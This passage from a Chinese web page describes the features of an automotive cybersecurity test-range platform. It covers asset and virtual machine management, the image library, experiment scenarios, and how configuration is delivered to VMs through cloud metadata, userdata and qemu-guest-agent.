"https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/dd2f438c89f580d9657c374e000cc52a.png"></p><p>工具管理</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/4491ed6a6fae87ce68038e604d44f4cc.png"></p><p>工具管理</p><p>在现代汽车制造业中，随着智能化技术的持续进步，汽车安全成为了一个多层面的领域，在产品生命周期的各个阶段均需考虑。以确保从设计、制造、使用到维修等全周期内的信息安全和物理安全得到保障。在这样的背景下，对汽车全生命周期的安全资产管理变得尤为重要。安全资产管理平台的建立至少需要包含以下14种安全资产的管理：</p><p>首先，靶场测试零部件的硬件平台管理涉及到测试环境中使用的所有硬件资源。包括但不限于传感器、控制器、通信模块等。对这些硬件平台进行详尽的登记、监控和更新，是确保测试结果有效性的基础。</p><p>操作系统内核版本信息的管理对于确保系统安全至关重要。操作系统是车载信息系统的中枢，是支持所有应用运行的基础。内核版本的更新和漏洞修补是防御外部攻击的第一道防线。</p><p>固件版本管理涉及到每个零部件的软件层面。汽车中的每个电子设备都有自己的固件来控制其运行，固件的漏洞可能导致安全隐患，因此及时更新固件至关重要。</p><p>中间件版本管理是安全资产管理的另一关键部分，因为中间件为不同的软件提供了一种沟通机制。若中间件存在缺陷，则可能影响到车载系统的整体安全性。</p><p>应用程序版本管理同样重要，因为用户交互最多的就是应用程序。确保应用程序的稳定性和安全性，能够预防潜在的攻击和故障。</p><p>在被测整车层面，品牌管理是保护品牌声誉和避免伪造的重要手段。车型、车辆以及车型项目（年款）的管理，则是为了详细记录每一款车的安全特性，确保它们各自满足特定的安全标准。</p><p>在整车的安全资产管理中还包含车辆内部零部件的硬件平台、操作系统内核版本信息、固件版本、中间件版本、应用程序版本等，这与靶场测试零部件的管理相似，但应用范围扩展到了整个车辆。</p><p>基础平台系统中的虚拟资源管理同样不可忽视。至少应包含以下4种：</p><p>镜像管理，它能够使测试环境快速部署和还原，提高测试效率，同时也是版本控制的一个重要方面。</p><p>靶标管理，这是攻防模拟中不可缺少的一部分。通过虚拟化技术创建的测试目标（靶标），可供安全测试使用，以检验系统漏洞和防御能力。</p><p>攻防工具的管理是为了控制这些工具的合规使用并确保它们的更新与效力，以适应不断演变的网络威胁。</p><p>场景模板管理，确保安全测试人员可以模拟各种实际交通和网络场景，对车辆的反应和处理能力进行全面检测。</p><p>除了上述所述的安全资产管理内容，还需要考虑到安全策略、法规遵从、持续监控、风险评估与应急响应等方面。在整个安全资产的生命周期内，从识别、分类、维护到处置各个环节都应该基于结构化和标准化的流程，以保证信息的整合性和可操作性。</p><p>实施有效的安全资产管理，除了需要有针对性的技术解决方案，还需依赖于人员的培训和意识提升。安全相关的人员应具备系统的知识结构，从硬件到软件，从测试环境到真实世界的应用场景，都要能够掌握相关安全资产的管理与操作。</p><p>安全资产管理平台不仅是一个技术工具，它还需要与企业的业务流程、政策和文化融合，从而构建起一个全面、综合性的汽车安全资产管理体系。这样的体系能够确保在汽车全生命周期中的每一个环节，都能对抗潜在的安全威胁，减轻安全事故带来的风险，最终保障消费者和公众的利益。</p><ul><li>支持靶场工程的管理，能够查看工程占用资源的数量，能够删除、清空工程，提供产品功能截图证明；</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/c5aed52b9302ad5d1e54b3e1f7be24b2.png" alt="WPS图片(121)"></p><p>功能参数设计方面，平台提供了全面的汽车安全资产管理功能，包括14种不同类型的安全资产管理，涵盖了靶场测试零部件的硬件平台、操作系统内核版本信息、固件版本、中间件版本、应用程序版本等信息。此外，还包括基础平台系统中的4种虚拟资源管理，如镜像、靶标、攻防工具和场景模板等。用户可以对这些安全资产进行添加、删除、导入等操作，确保安全资产的完整管理。</p><p>在镜像资源管理方面，平台支持镜像的添加、删除和导入，用户可以管理镜像的相关信息，包括镜像名称、大小、虚拟化类型、接入用户密码信息以及驱动类型等。</p><p>此外，平台还提供了物理设备管理功能，支持虚实互连交换机端口上连接的实物设备的注册。它还能够管理靶场工程，包括查看工程占用资源的数量，删除和清空工程等操作。学习资源的管理也得到了支持，包括课程、实验、视频、客观题、主观题、试卷和指导书等，用户可以查看状态、修改权限和删除资源。</p><p>虚拟化设备的配额管理是平台的一项重要功能，用户可以管理虚拟CPU、磁盘总量、内存总量等配额参数，以便对资源进行有效分配。此外，平台还支持流量资源的管理，允许用户上传流量包数据，用于回放等用途。</p><p>性能参数设计方面，平台支持管理镜像数量高达1000个，其中包括50个系统基础镜像和100个常用应用镜像，还配置了300个漏洞镜像，确保了资源管理的充分性和多样性。</p><p>试验管理支撑仿真网络环境运行的物理设备，包括支撑虚拟化的物理主机和交换机，以及以实物的方式接入到仿真网络环境中去的设备，并管理支撑虚拟化的物理主机的计算资源和网络资源，虚拟试验用的仿真网络环境，配置所管理的实物设备，构建高逼真度的仿真网络环境。虚拟资源管理提供对仿真虚拟节点的支撑能力，并支持虚拟节点之间的网络连接以及虚拟节点与实物节点之间的网络连接，支撑用户对虚拟机节点的访问。</p><p>试验资源管理包括虚拟节点和服务管理、虚拟网络支撑扩展、虚拟机访问、和实物靶标管理四个部分。主要功能描述如下：</p><p>（1）具备虚拟网络配置管理能力。支持对网络拓扑结构的通用描述，包括子网、子网间的访问规则、网络节点、网络节点的连接规则、网络节点的外网访问规则等；支持通过网络拓扑结构的通用描述生成仿真网络环境，包括子网、网络节点及其的访问控制规则；</p><p>（2）具备虚拟镜像的管理能力。提供对虚拟镜像的集中存储管理，提供虚拟镜像的上载、下载功能，提供虚拟镜像的编辑工具；提供构建虚拟网络所必需的各类主流操作系统基础镜像，包括典型的Windows系列、Linux系列；提供按虚拟机实例创建虚拟镜像的功能，以扩展虚拟机镜像库；</p><p>（3）具备虚拟节点的加载、运行与调度管理等支持能力。支持KVM等主流的虚拟化技术，以开源软件为主进行硬件设备虚拟化，便于功能扩展，支持虚拟网络节点的动态启动、暂停/恢复、重启等；支持设置虚拟机的登录口令的注入，支持虚拟机运行状态的监控，能从崩溃中自动恢复到初始状态；</p><p>（4）具有轻量级的网络节点仿真能力。支持HTTP、UDP、TCP、ICMP、SSH、TELNET等基础协议仿真，能够与真实软件通信；支持交换机、路由器仿真，支持静态路由配置；</p><p>（6）提供对虚拟网络节点访问的支持能力。提供对虚拟机节点的远程桌面支持能力；提供对虚拟机节点访问的可配置的录屏/回放功能；</p><p>（7）提供将实物设备接入虚拟网络并实现透明连接，通常需要使用特定的网络虚拟化技术和设备，比如以下方法：</p><p>网络虚拟化平台：使用如V Open vSwitch等网络虚拟化平台可以将物理设备与虚拟网络相连。这些技术通常支持创建虚拟交换机、路由器等，允许物理设备透明地成为虚拟化环境的一部分。</p><p>（8）具备系统资源与试验资源的存储管理能力，可进行系统资源的注册、查询修改，支持按类型、名称、来源等条件检索各种资源；可进行试验数据、态势要素的存储、检索、查询等，能够兼容、导入不同格式的试验数据，并可根据数据类型将其以多种格式导出（dmp/sdf/txt/xml等）；综合使用关系型数据库和NoSQL类数据库，对于采集数据采用NoSQL类数据库进行存储；数据库支持PB级别的海量存储，具备可扩展性，能够进行纵向和横向的扩展，具备备份恢复机制。</p><h4 id="虚拟机管理"><a href="#虚拟机管理" class="headerlink" title="虚拟机管理"></a>虚拟机管理</h4><p>系统可实现对虚拟机的所有生命周期管理相关操作（创建、启动、暂停、恢复、休眠、重启、安全关闭、强制关闭、删除、克隆、迁移、备份、快照、克隆为模板等常用生命周期管理操作），虚拟机迁移路径等进行日志监控收集，方便事后审计追踪。</p><p>支持批量修改虚拟机的配置参数，包括：I/O优先级、启动优先级、是否自动迁移、CPU调度优先级、CPU个数、内存大小、自动启动、启用VNC代理、tools自动升级等。</p><p>支持对系统中虚拟资源、物理资源的管理，虚拟资源包括攻防工具、场景模板、镜像、靶标等；可以方便地进行镜像的删除和导入、添加操作。在镜像资源的管理过程中，用户可以获取详细的镜像信息，包括镜像虚拟化类型、名称、大小、接入用户密码信息和驱动类型等关键属性。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/a0641b1f5d32395201a5d3f5c23f7439.jpeg" alt="WPS图片21"></p><p>：资源管理</p><p>系统持管理大量的镜像资源，包括不少于1000个镜像的管理和配置。其中系统基础镜像的数量不少于50个，常用应用镜像的数量不少于100个，漏洞镜像的数量也不少于300个。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/b38399a2626d85877fcaba0cfb589997.jpeg" alt="WPS图片(22"></p><p>虚拟机管理</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/e3cac3b876f877f1024bdcb2a5c80e71.png"></p><p>批量修改界面</p><p>VNC代理功能功能在配置linux功能时开启。</p><p>支持将虚拟机在线克隆为模板，模板制作过程中对业务运行无影响，同时虚拟机模板支持完整性验证与来源追溯，避免虚拟机模板文件被篡改的可能性，并追踪虚拟机模板的来源以及虚拟机模板部署的记录。</p><p>在单台物理机上运行100个虚拟机情况下，能够支持100个虚拟机进程调度最大延迟平均时间10us;（提供利用perf -sched命令测试的虚拟机进程调度延迟截图，100个虚拟机进程的调度最大延迟(Maximum delay ms)时间的平均值不超过0.01ms）。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/c9cd8ae880552d619228b4b0007d6d34.jpeg" alt="D:\\1.CyberSecurity\\文档修改\\六所靶场\\六所2021.3.29\\延迟xiugai.jpg"></p><p>部署延迟</p><h4 id="虚拟机ACL配置"><a href="#虚拟机ACL配置" class="headerlink" title="虚拟机ACL配置"></a>虚拟机ACL配置</h4><p>系统支持虚拟机的入方向、出方向、出入方向安全访问控制功能，可基于IP、MAC、端口号、时间段等设置访问规则。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/1b70f57dfe2eb1a88602a46ebf0213d2.png"></p><p>基于时间段ACL</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/0c37d7d0874f2900d2e6979c967326c2.png"></p><p>基于MAC ACL</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/1a8b8785924ccfa47afb839289f2a3ba.png"></p><p>基于IP ACL</p><h4 id="虚拟机部署"><a href="#虚拟机部署" class="headerlink" title="虚拟机部署"></a>虚拟机部署</h4><p>系统在部署虚拟机的时候支持批量部署：基于虚拟机模板一次性批量部署大量的虚拟机，虚拟机可以指定在某一台物理主机，也可以指定为集群内自动均衡分布。</p><p>提供虚拟机回收站功能，防止因虚拟机误删除导致数据丢失，支持设置回收站文件保存周期，超期的文件将被自动删除，支持批量销毁或还原虚拟机 。</p><p>镜像库管理模块为系统中的各节点提供镜像支撑，是整个系统的基础模块。镜像库管理模块维护的镜像库中预存了包括终端、交换机、路由器三种类型在内的多种镜像，用户可通过本模块，利用镜像反复构建所需节点。</p><p>本模块提供对镜像的查询、上传、删除功能。</p><p>查询：用户可以根据镜像名或镜像唯一标识，在镜像库中查询镜像信息。</p><p>上传：用户可以根据需求，个性化定制镜像，并将其上传至镜像库中，从而使得镜像库中的镜像类型更加丰富。</p><p>删除：针对无用的镜像，用户可以根据镜像名或镜像唯一标识删除镜像，减小镜像库所占磁盘大小。</p><p>镜像库中预存的镜像如下表所示，共包含终端、交换机、路由器三类镜像。终端镜像包括Windows、Linux、Unix、MacOS四大主流操作系统及其各类发行版镜像，集FTP、邮件、NTP、DNS、Web、VPN等多种网络服务于一体的镜像。交换机镜像包括二层、三层交换机及SDN交换机镜像。路由器镜像包括Cisco、Juniper、H3C等路由器镜像，vyos等开源路由器镜像以及中继节点镜像。</p><p>镜像库管理模块包含api、registry两个服务，api服务对外提供REST API，可用于响应其他模块的请求。</p><p>api服务：所有发往本模块的请求都会先提交给api服务，由api服务对请求做进一步解析，进而通过中间件将解析后的消息转发给后端的registry服务。</p><p>registry服务：registry服务在收到api转发过来的消息后，根据消息对镜像文件以及镜像数据库做实际操作。</p><p>镜像管理模块的后端默认为本地文件系统，即将上传的镜像保存至本地的指定目录，由本模块统一管理。在生产环境中，本模块支持使用NFS、Ceph等作为后端，实现镜像的分布式存储与管理，提高性能及容错性。</p><p>下图为本模块的架构图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/9b941ff426233b305add1d938c0f1306.png" alt="镜像库管理模块架构图"></p><p>镜像库管理模块</p><h4 id="镜像管理"><a href="#镜像管理" class="headerlink" title="镜像管理"></a>镜像管理</h4><p>镜像资源管理可以对试验的虚拟资源进行统一管理。包括虚拟机镜像、Docker镜像、虚拟试验环境、虚拟机节点、Docker容器节点、虚拟链路、安全组、IPs、VLANs等资源的统一调度和管理。支持用户对这些虚拟资源进行增加、删除、修改、查询和监控。具有计算终端台式机、笔记本、服务器、手持终端）、路由器、交换机、防火墙、IDS等多种网络节点的镜像，支持2种路由器，至少支持16种常用虚拟主机配置。</p><p>虚拟网络节点镜像文件是虚拟节点静态化存在的形式，服务于虚拟目标网络的构建，便于自动化部署。虚拟镜像库库的结构如图所示。试验用户可以基于图形界面对镜像进行管理，包括创建、查询、修改和删除镜像。支持创建组成目标网络的各类虚拟节点，包括路由设备、主机和网络安防设备等，创建预装各种应用软件组合的多种虚拟节点，形成虚拟镜像文件。虚拟镜像既可以通过虚拟机实例创建产生，也可以通过注册虚拟机模板镜像产生。注册虚拟机模板主要是把其他第三方提供的模板镜像注册到系统中为模板制作提供资源进行统一管理。创建好的镜像保存在文件服务器上，相关的镜像信息，包括镜像的ID、类型、参数配置等，保存在数据库中。根据镜像的类型、参数、预装软件等信息，对镜像进行进行分类。在数据库中可以直接根据类别查询镜像，也可以使用Group by查询各种不同的分组。</p><p>虚拟镜像管理模块</p><p>在创建虚拟机或网络设备时，根据配置文件中的信息，首先从镜像信息库中查找相应镜像的位置，由镜像临时管理模块负责镜像调出、分发等操作，并在使用完毕后负责清除临时镜像文件。</p><p>提供构建虚拟网络所必需的各类主流操作系统基础镜像，包括典型的Windows系列、Linux系列。镜像库支持的主要虚拟设备和系统类型如下。</p><p>虚拟网络设备：虚拟路由器：支持Cisco、Juniper，具备标准功能的虚拟路由器。</p><p>虚拟交换机：支持具备标准功能的虚拟交换机。</p><p>虚拟主机配置,支持16种以上常用虚拟主机配置，可以根据用户需求添加新的虚拟主机配置。</p><p>操作系统基础镜像：</p><p>Windows系列：</p><p>Windows 2000 Advanced Server; Windows 2000 Professional</p><p>Windows 2000 Server SP4 (32-bit); Windows 3.1</p><p>Windows 7 (32-bit); Windows 7 (64-bit); Windows 95; Windows 98</p><p>Windows NT 4; Windows PV; Windows Server 2003系列（32-bit、64bit）;</p><p>Windows Server 2008系列（32-bit、64bit）</p><p>Windows XP （32-bit、64bit，SP2、SP3）</p><p>Windows Vista （32-bit、64bit）</p><p>Linux系列：</p><p>Asianux 3 (32-bit/64-bit)</p><p>CentOS系列（4.5-6.0, 32-bit/64-bit）</p><p>Debian GNU/Linux系列 (4-6, 32-bit/64-bit)</p><p>FreeBSD (32-bit/64-bit)</p><p>Oracle Enterprise Linux系列(5.0-6.0, 32-bit/64-bit)</p><p>Red Hat Enterprise Linux系列(2.0-6.0, 32-bit/64-bit)</p><p>SUSE Linux Enterprise (8-11, 32-bit/64-bit)</p><p>Ubuntu (9.10-10.04, 32-bit/64-bit)</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/baaa2e39608bf51f9334ecdd136565f2.png"></p><p>虚拟镜像管理</p><h4 id="靶场工程管理"><a href="#靶场工程管理" class="headerlink" title="靶场工程管理"></a>靶场工程管理</h4><p>环境管理主要是对仿真的虚拟化环境进行管理，管理的操作包括对整个虚拟化环境的重启、停止、启动、重置、销毁的管理，也可以对环境中的子网或者每一个设备进行上述的管理。支持列表展示每个仿真环境的相关信息（含子网数量、主机个数、运行状态、创建时间。支持按照用户的试验网络拓扑设计自动部署试验环境，支持在指定宿主机范围内部署试验环境，支持已部署的试验环境的网络拓扑的修改与增量式部署。在具体的试验环境中，支持对试验环境中网络出口规则、入口规则和转发规则的配置，系统提供配置界面，以支持试验环境的恢复和对试验环境的监控。支持通过配置界面或配置文件在多节点上批量安装、备份或还原操作系统。</p><p>具体的实例环境除了可以进行以上的操作管理外，还提供整个网络的镜像管理功能。提供一键式对整个环境进行镜像备份，也可以有选择的对环境中某个设备进行镜像。系统提供镜像文件的展示，用户可以将整个环境恢复到某个镜像状态。镜像包括有内存镜像和磁盘镜像。对于多个镜像的环境，可以进行列表或者树形的结构展示。支持在整个试验环境/子网/虚拟节点三个层面的备份/恢复，并支持对试验环境/子网/虚拟节点的多个备份版本的管理，支持五个及以上的备份版本。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/a2343e4071db8e992df985f1bb11e3ff.png"></p><p>试验环境管理</p><p>环境管理中对所有虚拟机都提供远程访问URL，用户通过点击URL访问虚拟机，在虚拟机界面上按Ctrl+Alt+Shift快捷键，可打开客户端机器与远程虚拟机的通信共享操作界面。虚拟机内部的内容可以通过剪切板复制到本地，本地机器复制的内容也可以通过剪切板粘贴到远程虚拟机中。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/4c0951cb64c6c9d7a4c88e484328e12f.png"></p><p>虚拟机远程访问</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/afc5fb06bbb28a846e564a62416d021f.png"></p><p>虚拟机的远程复制粘贴</p><p>通过虚拟机的通信界面，还可以通过浏览器将本地文件上传到虚拟机中，虚拟机需要支持tftp、vnc、rdp、ssh等其中的某项协议。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/ab915fb0fd9c1b21fe405c4586733dd9.png"></p><p>本地与远程虚拟机间上传文件</p><p>可查询所有或指定虚拟机运行状态、CPU核数、CPU利用率、内存容量、内存利用率、虚拟机操作系统、所在计算节点主机等统计报表，并导出为PDF格式文档。同时，支持查询指定虚拟化主机在指定时间段内的CPU利用率、内存利用率、磁盘读速率、磁盘写速率、磁盘I/O吞吐量、网络总流量、网络读流量、网络写流量、网络读速率和网络写速率等关键性能报表。</p><h4 id="试验场景管理"><a href="#试验场景管理" class="headerlink" title="试验场景管理"></a>试验场景管理</h4><p>试验场景描述了一个试验场景的具体内容，包括步骤、角色、结果评判、试验文档、试验所需环境等信息。对于试验设计人员来说，需要基于它创建特定的任务，以供试验人员进行使用。试验场景管理支持试验过程控制，主要包括试验环境构建过程管理、试验运行进程控制，可根据试验任务配置方案启动相关试验环绕的构建过程，支持控制试验的开始、暂停、继续、回滚、回放、停止、科目更换和资源回收。支持多种方式查询试验相关信息、试验状态的保存和恢复。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/50d974e408a5a555fb110968a9b29e24.png"></p><p>试验场景切换</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/ae4fcf7ca4c0ed785d8d351b38994765.png"></p><p>试验过程管控</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/b85a2f50a7222d19285b68989a3e321f.png"></p><p>试验场景查看</p><p>支持场景保存模板功能。配置参数包括名称，权限（私有、共享）。描述等字段。保存时，会将流程图、任务数据、人员数据等数据进行存储。</p><p>支持对设备资源、IP地址池、VNF资源、VNID池等资源进行图形化管理；设备资源管理支持对物理设备、虚拟设备、边界设备组、L4~L7物理资源池等进行管理。</p><h4 id="配置管理模块"><a href="#配置管理模块" class="headerlink" title="配置管理模块"></a>配置管理模块</h4><p>配置管理模块用于管理用户的配置文件，可用于从虚拟节点中读取用户所需数据或将用户所需配置写入虚拟节点中，其中配置内容包括：</p><p>控制命令：对虚拟节点中的程序下发启动、暂停、停止等控制命令，可实现对程序的远端控制。控制命令可反复下发。</p><p>配置文件：下发虚拟节点内的程序所需要的配置文件，配置文件中的内容可根据程序的需求进行定制。提供主机参数包括IP/MAC地址、网关地址、型号等，路由、安防设备参数包括IP地址、端口、安防策略等；</p><p>在线迁移：下发配置命令，能够实现在线动态更新内核，打补丁，在线迁移功能。</p><p>本模块共提供三种不同的方式实现配置管理，用户可根据自己的需要，自行选择所需的方式进行配置管理。三种方式如下：</p><p>方式一：在虚拟机所在网络具有系统提供的DHCP服务节点时，可在该DHCP服务节点上利用scp的方式向虚拟节点写入配置文件或从配置文件中读取数据，该方式利用了虚拟网络，对配置的内容与大小没有限制。虚拟节点需要开启SSH服务。</p><p>方式二：利用metadata或userdata，该方式仅支持将配置写入虚拟节点中，该方式同样利用了虚拟网络，对配置的内容无限制，对配置文件的大小有限制。</p><p>方式三：利用qga，该方式同时支持将配置写入虚拟节点以及从虚拟节点读取数据，并且该方式不依赖于虚拟网络，对配置的内容与大小没有限制。虚拟节点需要安装qemu-guest-agent服务。</p><p>配置管理模块具备三种不同的方式实现配置的下发及数据的读取，针对三种不同的方式，有以下三种不同的实现方法：</p><p>方式一：该方式包含2个服务：api服务及config_transfer_agent服务。当用户选用本方式进行配置管理时，可将请求发送至api服务，由api服务解析请求，通过管理网络交由config_transfer_agent服务，config_transfer_agent服务通过虚拟节点所在网络对虚拟机做实际操作。</p><p>方式二：该方式中，会将用户需要写入虚拟节点的配置信息交由meta-agent服务，当虚拟节点成功启动后，可通过访问<a href="http://169.254.169.254/openstack/latest/meta_data.json%E7%9A%84%E6%96%B9%E5%BC%8F%E9%97%B4%E6%8E%A5%E8%AE%BF%E9%97%AEmeta-agent%E6%9C%8D%E5%8A%A1%EF%BC%8C%E4%BB%8E%E8%80%8C%E8%8E%B7%E5%8F%96metadata%E3%80%82%E5%90%8C%E7%90%86%EF%BC%8C%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B9%9F%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E8%AE%BF%E9%97%AEhttp://169.254.169.254/latest/user-data%E7%9A%84%E6%96%B9%E5%BC%8F%EF%BC%8C%E8%8E%B7%E5%8F%96user-data%E3%80%82">http://169.254.169.254/openstack/latest/meta_data.json的方式间接访问meta-agent服务，从而获取metadata。同理，虚拟机也可以通过访问http://169.254.169.254/latest/user-data的方式，获取user-data。</a></p><p>方式三：该方式包含3个服务：api服务、qemu_guest_agent_proxy服务以及qemu_guest_agent服务，其中qemu_guest_agent服务处于虚拟节点内部。当用户选用本方式进行配置管理时，可将请求发送至api服务，由api服务解析请求并根据虚拟节点的唯一标识获得其所在宿主机地址，进而将请求消息通过消息中间件转发至虚拟节点所在宿主机的qemu_guest_agent_proxy服务，qemu_guest_agent_proxy服务通过解析消息获得虚拟节点唯一标识，从而将用户请求交付给虚拟节点内部的qemu_guest_agent服务，由qemu_guest_agent服务根据消息的主体部分做具体操作。</p><p>使用metadata或userdata的方式将配置信息写入虚拟节点：</p><p>使用metadata：首先使用系统账号和密码登陆仿真系统。</p><p>依次点击左侧栏中的“项目”、“计算”、“实例”</p><p>然后点击右上角的“创建实例”，在弹出的界面中填写需要创建的虚拟节点的相关信息</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/2b10b0b465e56bcae9ea8a3cd16fe301.png"></p><p>创建实例</p><p>然后在弹出的界面的左侧栏中点击“元数据”一栏，在“Custom”中填入需要传入的信息的key值（如“test_key”），点击“+”，接着在右侧的对应栏中填入需要传入的信息的value值（如“test_value”），点击“创建实例”开始创建虚拟节点</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/8847f522b9c3a18dbdf7e9802c222463.png"></p><p>开始创建虚拟节点</p><p>进入创建成功的虚拟节点中，使用“curl <a href="http://169.254.169.254/latest/meta-data/test_key">http://169.254.169.254/openstack/latest/meta-data.json”命令，即可获得</a>json文件，在获得的json文件中的meta字段，可以获得之前传入的配置信息</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/c558f35ad9c0d17e3ab08cf58be1be4e.png"></p><p>获得传入信息</p><p>使用userdata：</p><p>首先使用系统账号和密码登陆仿真系统</p><p>依次点击左侧栏中的“项目”、“计算”、“实例”</p><p>然后点击右上角的“创建实例”，在弹出的界面中填写需要创建的虚拟节点的相关信息</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/120da088001b8d3bb29685ed2fcf5b76.png"></p><p>:创建实例</p><p>然后在弹出的界面的左侧栏中点击“配置”一栏，在“定制化脚本”中填入需要传入的信息（如“this is a test.”），点击“创建实例”开始创建虚拟节点</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/fd340220e4bd224d293765a005b50610.png"></p><p>创建虚拟节点</p><p>进入创建成功的虚拟节点中，使用“curl <a href="http://169.254.169.254/latest/meta-data/test_key">http://169.254.169.254/latest/user-data”命令，即可获得</a>之前传入的配置信息。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/0e45732747a7dd462e8cf3b4f387411e.png"></p><p>获得之前配置信息</p><p>使用qga的方式进行配置管理：</p><p>配置管理:数据的执行配置与操作,本系统支持不通过网络环境直接操纵虚拟节点进行命令执行的操作，并能实时获取执行结果。新建一条数据执行的配置项，如下图所示：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/0288ea9118ed54ce411ff1bf2a662575.png"></p><p>新建执行</p><p>数据的执行操作要在此基础上，结合任务操作来一起进行。在任务管理面板中，创建一个新的任务，任务类型选为执行虚拟机的指令，然后配置该任务的表单项，配置完成后保存。可以在任务面板上控制任务的启停，达到控制该条数据是否在虚拟节点中执行的效果。</p><p>在创建任务中，选择最新配置的这条“testabc”的执行命令，配置进行任务的虚拟机，点击确定保存一条任务。然后启动任务就可以完成数据的执行。如下图所示：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/4d25f0486f7b1dde2025af56585263d9.png"></p><p>创建任务</p><p>所有的数据执行配置可以在数据执行配置列表中查看，操作者可以在列表界面进行添加一条数据执行的命令，或者在原有配置命令中进行修改或删除的操作。如下图所示：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/442a1609e9b9cdf0576562580458ba36.png"></p><p>配置管理</p><h4 id="学习资源管理"><a href="#学习资源管理" class="headerlink" title="学习资源管理"></a>学习资源管理</h4><p>试验文档管理用于管理试验所需的帮助信息。新增的试验工程可以设置是否需要帮助信息。在试验的步骤设计中也可以指定帮助主题。试验文档帮助信息包括帮助主题、内容类型（文本或者多媒体类型）等。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/a8a111389e5c3ff818b9c4783f7de86e.png"></p><p>文档模板</p><p>支持试验报告的辅助生成，具备试验报告模板，支持模板的自定义编辑</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/641cb048a3771ee3b87d5c685e0ec24c.png"></p><p>试验报告</p><p>系统支持报告提交任务配置。配置参数包括任务执行最长用时、人员数据以及描述等字段。</p><p>支持学习资源的综合管理，包括视频、客观题、主观题、课程、实验、试卷以及指导书等。管理员可以通过系统对学习资源进行管理，包括查看资源的状态、修改权限以及删除资源等操作。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/5ff49171158d2d4a370cd77637b13af3.jpeg" alt="WPS图片(24"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/cfedf0ffd22bdcd2b413608ed69ff25a.png"></p><p>学习资源管理</p><h2 id="运维管理模块"><a href="#运维管理模块" class="headerlink" title="运维管理模块"></a>运维管理模块</h2><ul><li>支持物理服务器层面宏观的平台负载情况监控，可对物理服务器进行性能评估，提供基于综合负载、CPU、内存使用率、网络速度等不少于5类监测数值，提供产品功能截图证明；</li></ul><p><img 